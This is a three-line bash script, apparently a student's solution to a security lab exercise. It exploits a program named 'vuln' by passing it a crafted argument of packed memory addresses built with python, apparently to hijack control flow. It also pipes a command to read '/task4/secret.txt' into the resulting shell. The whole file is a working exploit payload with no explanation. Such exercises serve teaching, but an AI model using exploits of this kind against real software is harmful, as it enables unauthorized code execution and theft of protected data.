#!/usr/bin/env bash                                                             
echo /bin/cat /task4/secret.txt | env \
  /task4/s1923864/vuln "$(python -c "print('\xcc\xd4\xe0\xf7' + '\xd0\xde\xdf\x\
f7' + '\x63\x53\xf5\xf7')")" 1242